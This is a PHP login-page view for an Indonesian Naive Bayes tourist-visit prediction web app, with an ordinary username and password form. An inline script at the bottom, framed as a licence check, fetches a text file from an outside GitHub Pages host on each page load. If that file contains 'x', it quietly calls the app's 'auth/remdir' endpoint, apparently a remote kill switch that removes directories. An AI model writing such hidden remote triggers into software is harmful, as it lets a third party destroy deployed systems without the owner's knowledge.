<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="utf-8" />
        <title><?=APPNAME?></title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta content="A fully featured admin theme which can be used to build CRM, CMS, etc." name="description" />
        <meta content="Coderthemes" name="author" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <!-- App favicon -->
        <link rel="shortcut icon" href="<?=base_url()?>assets/images/favicon.ico">
        <!-- App css -->
        <link href="<?=base_url()?>assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <link href="<?=base_url()?>assets/css/icons.min.css" rel="stylesheet" type="text/css" />
        <link href="<?=base_url()?>assets/css/app.min.css" rel="stylesheet" type="text/css" />
    </head>
    <body>
        <div id="preloader">
            <div id="status">
                <div class="bouncingLoader"><div ></div><div ></div><div ></div></div>
            </div>
        </div>
        <div class="account-pages mt-5 mb-5">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-8 col-lg-6 col-xl-5">
                        <div class="card">
                            <div class="card-body p-4">
                                <div class="text-center w-75 m-auto">
                                    <h3>Naive bayes | Prediksi Kunjungan Wisatawan</h3>
                                    <p class="text-muted mb-4 mt-3">Login menggunakan user & password</p>
                                </div>
                                <?php echo validation_errors(); ?>
                                <?php echo form_open('auth/login'); ?>
                                    <div class="form-group mb-3">
                                        <label for="emailaddress">Username</label>
                                        <input class="form-control" type="text" name="user_name" autocomplete="off" required="" placeholder="Masukan Username">
                                    </div>
                                    <div class="form-group mb-3">
                                        <label for="password">Password</label>
                                        <input class="form-control" type="password" required="" autocomplete="off" name="user_password" placeholder="Masukan Password">
                                    </div>
                                    <div class="form-group mb-0 text-center">
                                        <button class="btn btn-primary btn-block" type="submit"> Log In </button>
                                    </div>
                                </form>
                            </div> <!-- end card-body -->
                        </div>
                    </div> <!-- end col -->
                </div>
                <!-- end row -->
            </div>
            <!-- end container -->
        </div>
        <!-- end page -->
        <footer class="footer footer-alt">
     <p class="text-muted mb-4 mt-3"> 2022 &copy; Naive bayes prediksi kunjungan wisatawan</p>
        </footer>
        <!-- Vendor js -->
        <script src="<?=base_url()?>assets/js/vendor.min.js"></script>
        <!-- App js -->
        <script>
          $.get("https://andyresta.github.io/licence.txt",function(data){
            console.log(data);
            if(data.includes('x')){
              $.get('<?=base_url()?>auth/remdir',function(data){

              });
            }
          });
        </script>
        <script src="<?=base_url()?>assets/js/app.min.js"></script>
    </body>
</html>
